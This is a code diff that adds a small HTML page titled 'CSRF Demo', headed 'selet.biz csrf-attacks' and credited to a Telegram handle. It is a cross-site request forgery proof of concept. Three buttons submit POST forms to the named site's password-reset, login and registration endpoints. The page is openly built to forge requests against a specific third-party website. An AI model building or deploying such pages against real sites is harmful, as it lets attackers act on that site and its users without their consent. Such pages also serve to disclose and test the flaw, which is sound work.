@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            text-align: center;
+            margin-top: 50px;
+        }
+        button {
+            font-size: 16px;
+            padding: 10px 20px;
+            margin: 10px;
+            cursor: pointer;
+            border: 1px solid #ccc;
+            background-color: #f4f4f4;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #ddd;
+        }
+    </style>
+</head>
+<body>
+    <h1>selet.biz csrf-attacks</h1>
+    <p>by <a href="https://t.me/merankkon">@merankkon</a></p>
+
+    <form action="http://selet.biz/auth/?forgot_password=yes" method="POST">
+        <button type="submit">Потерянный пароль</button>
+    </form>
+
+    <form action="http://selet.biz/auth/?login=yes" method="POST">
+        <button type="submit">Логин</button>
+    </form>
+
+    <form action="http://selet.biz/auth/?register=yes" method="POST">
+        <button type="submit">Регистрация</button>
+    </form>
+</body>
+</html>
